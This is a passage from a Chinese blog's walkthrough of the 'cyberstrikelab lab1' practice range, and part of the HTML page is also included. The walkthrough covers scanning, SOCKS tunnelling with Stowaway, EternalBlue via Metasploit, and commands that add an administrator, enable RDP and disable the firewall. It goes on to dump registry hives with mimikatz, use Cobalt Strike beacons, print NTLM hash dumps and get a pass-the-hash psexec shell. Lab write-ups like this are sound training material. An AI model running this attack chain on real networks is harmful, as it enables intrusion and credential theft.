class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">135</span>, service=unknown<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=WIN-KOHRC1DGOL9</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=WIN-</span>7NRTJO59O7N, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">18</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:hostname=cyberweb</span>, ipv4=[<span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span>], ipv6=[]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:fingerprints=[]</span>, port=<span class="hljs-number">80</span>, service=http, title=易优<span class="hljs-variable constant_">CMS</span> -  <span class="hljs-title class_">Powered</span> by <span class="hljs-title class_">Eyoucms</span>.com, url=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.20.10, status_code=200, length=25157, server_info=map[cache-control:private content-type:text/html</span>; charset=utf-<span class="hljs-number">8</span> <span class="hljs-symbol">date:</span><span class="hljs-title class_">Sun</span>, <span class="hljs-number">30</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">2025</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">expires:</span><span class="hljs-title class_">Thu</span>, <span class="hljs-number">19</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">1981</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-variable constant_">GMT</span> <span class="hljs-symbol">length:</span><span class="hljs-number">25157</span> <span class="hljs-symbol">pragma:</span>no-cache <span class="hljs-symbol">server:</span><span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">39</span> (<span class="hljs-title class_">Win64</span>) <span class="hljs-title class_">Open</span>SSL/<span class="hljs-number">1.1</span>.1b mod_fcgid/<span class="hljs-number">2.3</span>.9a mod_log_rotate/<span class="hljs-number">1.02</span> set-<span class="hljs-symbol">cookie:</span><span class="hljs-variable constant_">PHPSESSID</span>=pv61gs48nge4geq3958vosk3m2; path=<span class="hljs-regexp">/ status_code:200 title:易优CMS -  Powered by Eyoucms.com x-powered-by:PHP/</span><span class="hljs-number">5.4</span>.<span class="hljs-number">45</span>]<br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:os_version=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, domain_name=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_domain=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, netbios_computer=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, workstation_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span>, server_service=<span class="hljs-variable constant_">WIN</span>-<span class="hljs-variable constant_">KOHRC1DGOL9</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.30</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:os=Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2008</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">7600</span>, port=<span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:port=</span><span class="hljs-number">445</span>, vulnerability=<span class="hljs-variable constant_">MS17</span>-<span class="hljs-number">010</span>, os=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>] [<span class="hljs-variable constant_">SERVICE</span>] 目标<span class="hljs-symbol">:</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.20</span> 状态<span class="hljs-symbol">:identified</span> 详情<span class="hljs-symbol">:workstation_service=CYBERWEB</span>, server_service=<span class="hljs-variable constant_">CYBERWEB</span>, os_version=<span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable constant_">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span>, port=<span class="hljs-number">139</span>, computer_name=cyberweb.cyberstrikelab.com, domain_name=cyberstrikelab.com, netbios_domain=<span class="hljs-variable constant_">CYBERSTRIKELAB</span>, netbios_computer=<span class="hljs-variable constant_">CYBERWEB</span><br>[<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">30</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span>] [<span class="hljs-variable constant_">VULN</span>] 目标<span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.10</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span> 状态<span class="hljs-symbol">:vulnerable</span> 详情<span class="hljs-symbol">:vulnerability_name=poc1</span>, references=[<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vulhub</span><span class="hljs-regexp">/vulhub/tree</span><span class="hljs-regexp">/master/thinkphp</span><span class="hljs-regexp">/5.0.23-rce], vulnerability_type=poc-yaml-thinkphp5023-method-rce</span><br></code></pre></td></tr></table></figure>
+
+<p>发现存在域环境<code>192.168.20.30</code>是域控服务器，而且用永恒之蓝漏洞，我们只要拿下域控，那么另一台机器就可以直接哈希传递工具拿下<code>192.168.20.20</code>,就是日穿内网了👌</p>
+<p>上传<code>Stowaway</code></p>
+<p>在kali启动admin端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin.exe -l 8000 -s 123<br></code></pre></td></tr></table></figure>
+
+<p>在jiaosu运行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">192.168.1.105:8000</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure>
+
+<p>加入节点，在运行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">0</span>(使用jiaosu节点)<br><span class="hljs-attribute">listen</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">7777</span><br></code></pre></td></tr></table></figure>
+
+<p>监听jiaosu的7777端口</p>
+<p>在靶机上运行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">172.16.233.2:7777</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure>
+
+<p>加上节点，在运行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">1</span>(使用靶机)<br><span class="hljs-attribute">socks</span> <span class="hljs-number">7776</span><br></code></pre></td></tr></table></figure>
+
+<p>搭建 socket隧道，在kali运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure>
+
+<p>把代理改成 <code>socks5 127.0.0.1 7776</code></p>
+<p>开打<code>msf17_010</code></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">search ms17_010<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.20.30</span><br>show <span class="hljs-comment">payloads</span><br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>这个模块不行</p>
+<p>换一个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330210000076.png" srcset="/img/loading.gif" lazyload alt="image-20250330210000076"></p>
+<p>拿到flag3但是没有域控的shell</p>
+<p>很难受</p>
+<p>但是20那台机器没有漏洞，就只能通过域控打，想办法上线</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user hack @Abc123 <span class="hljs-string">/add</span>  <span class="hljs-comment">#创建新用户</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators hack <span class="hljs-string">/add</span>  <span class="hljs-comment">#加入管理组</span><br><span class="hljs-keyword">set</span> COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27; <span class="hljs-comment">#打开远程桌面</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> netsh firewall <span class="hljs-keyword">set</span> opmode disable  <span class="hljs-comment">#关闭防火墙</span><br></code></pre></td></tr></table></figure>
+
+<p>使用msf执行命令</p>
+<p>用rdp登录域控机器 ps:登录域控机需在用户名前加<code>.\</code></p>
+<p>抓取hash</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save HKLM\sam <span class="hljs-name">C</span>:\Users\hack01\Desktop\sam.hive<br>reg save HKLM\system <span class="hljs-name">C</span>:\Users\hack01\Desktop\system.hive<br>reg save HKLM\security <span class="hljs-name">C</span>:\Users\hack01\Desktop\security.hive<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330235956036.png" srcset="/img/loading.gif" lazyload alt="image-20250330235956036"></p>
+<p>上传<code>mimikatz</code></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">privilege::<span class="hljs-keyword">debug</span><br>lsadump::sam /sam:sam.hive /<span class="hljs-keyword">system</span>:<span class="hljs-keyword">system</span>.hive /<span class="hljs-keyword">security</span>:<span class="hljs-keyword">security</span>.hive<br></code></pre></td></tr></table></figure>
+
+<p>找到了但是是假的😁</p>
+<p>上传cs正向马，目标主机不出网🤡</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331091159567.png" srcset="/img/loading.gif" lazyload alt="image-20250331091159567"></p>
+<p>难搞</p>
+<p>使用jiaosu当跳板，上传正向，木马到<code>192.168.10.10</code>在提取hash，尝试hash传递</p>
+<p>先上线jiaosu，直接传马</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093101546.png" srcset="/img/loading.gif" lazyload alt="image-20250331093101546"></p>
+<p>在建立个正向监听器，利用监听生成正向木马</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093236516.png" srcset="/img/loading.gif" lazyload alt="image-20250331093236516"></p>
+<p>上传到10的靶机再运行</p>
+<p>再cs让jiaosu监听<code>connect 192.168.10.10</code></p>
+<p>一会10机器上线成功</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093336037.png" srcset="/img/loading.gif" lazyload alt="image-20250331093336037"></p>
+<p>上传正向马到20.30那台机器，在20.10监听端口尝试上线域控</p>
+<p>在20.30机器上管理员运行木马</p>
+<p>成功上线</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403102526421.png" srcset="/img/loading.gif" lazyload alt="image-20250403102526421"></p>
+<p>hashdump一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::<br>cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::<br>hack:1106:aad3b435b51404eeaad3b435b51404ee:198ab7e5f71d046b8da029ecf671db65:::<br>WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:85a7f3800784ce0c8c3c43d150f1520f:::<br>CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:d222ce20e7e69c6ded4a7e96abd5ee1f:::<br></code></pre></td></tr></table></figure>
+
+<p>在<code>systeminfo</code>一波</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">主机名:           WIN-7NRTJO59O7N<br>OS 名称:          Microsoft Windows Server 2008 R2 Standard <br>OS 版本:          6.1.7600 暂缺 Build 7600<br>OS 制造商:        Microsoft Corporation<br>OS 配置:          主域控制器<br>OS 构件类型:      Multiprocessor Free<br>注册的所有人:     Windows 用户<br>注册的组织:       <br>产品 ID:          00477-179-0000007-84929<br>初始安装日期:     2024/12/22, 11:27:06<br>系统启动时间:     2025/4/3, 1:04:27<br>系统制造商:       Red Hat<br>系统型号:         KVM<br>系统类型:         x64-based PC<br>处理器:           安装了 1 个处理器。<br>                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2000 Mhz<br>BIOS 版本:        SeaBIOS 1.16.3-2.el9, 2014/4/1<br>Windows 目录:     C:\Windows<br>系统目录:         C:\Windows\system32<br>启动设备:         \Device\HarddiskVolume1<br>系统区域设置:     zh-cn;中文(中国)<br>输入法区域设置:   zh-cn;中文(中国)<br>时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐<br>物理内存总量:     1,023 MB<br>可用的物理内存:   448 MB<br>虚拟内存: 最大值: 2,047 MB<br>虚拟内存: 可用:   1,408 MB<br>虚拟内存: 使用中: 639 MB<br>页面文件位置:     C:\pagefile.sys<br>域:               cyberstrikelab.com<br>登录服务器:       \\WIN-7NRTJO59O7N<br>修补程序:         暂缺<br>网卡:             安装了 1 个 NIC。<br>                  [01]: Realtek RTL8139C+ Fast Ethernet NIC<br>                      连接名:      本地连接 3<br>                      启用 DHCP:   否<br>                      IP 地址<br>                        [01]: 192.168.20.30<br>                        [02]: fe80::f852:ed6d:f557:af3f<br><br></code></pre></td></tr></table></figure>
+
+<p>直接哈希传递攻击:</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs smali">impacket-0.12.0\examples&gt; python psexec.py -hashes<span class="hljs-keyword"> :94bd5248e87cb7f2f9b871d40c903927</span> cyberstrikelab.com/administrator@192.168.20.20<br>Impacket v0.12.0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies<br><br>[*] Requesting shares on 192.168.20.20.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file bxPkKhSM.exe<br>[*] Opening SVCManager on 192.168.20.20.....<br>[*] Creating service KEHT on 192.168.20.20.....<br>[*] Starting service KEHT.....<br>[!] Press help for extra shell commands<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>Microsoft Windows [�汾 6.3.9600]<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>(c) 2013 Microsoft Corporation����������Ȩ����<br><br><br>C:\Windows\system32&gt; cd /<br><br>C:\&gt; dir<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> ������ C �еľ�û�б�ǩ��<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> �������к��� EA78-322E<br><br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> C:\ ��Ŀ¼<br><br><br>2025/01/15  19:47                25 flag.txt<br>2013/08/22  23:52    &lt;DIR&gt;          PerfLogs<br>2013/08/22  22:50    &lt;DIR&gt;          Program Files<br>2013/08/22  23:39    &lt;DIR&gt;          Program Files (x86)<br>2025/01/14  16:37    &lt;DIR&gt;          Users<br>2025/04/03  02:51    &lt;DIR&gt;          Windows<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               1 ���ļ�             25 �ֽ�<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               5 ��Ŀ¼  6,237,618,176 �����ֽ�<br><br><br>C:\&gt; type flag.txt<br>go-flag&#123;Nb8VOT8X9SbIzyDI&#125;<br>C:\&gt;<br></code></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><strong>中等</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/cyberstrikelab/" class="category-chain-item">cyberstrikelab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>cyberstrikelab_lab1</div>
+      <div>https://tuyiisxp.github.io/2025/03/30/cyberstrikelab-lab1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tuyi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月30日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/30/cyberstrikelab-pt1/" title="cyberstrikelab-pt1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">cyberstrikelab-pt1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/" title="域名绑定GithubPage">
+                        <span class="hidden-mobile">域名绑定GithubPage</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', '258369123/pinglun');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
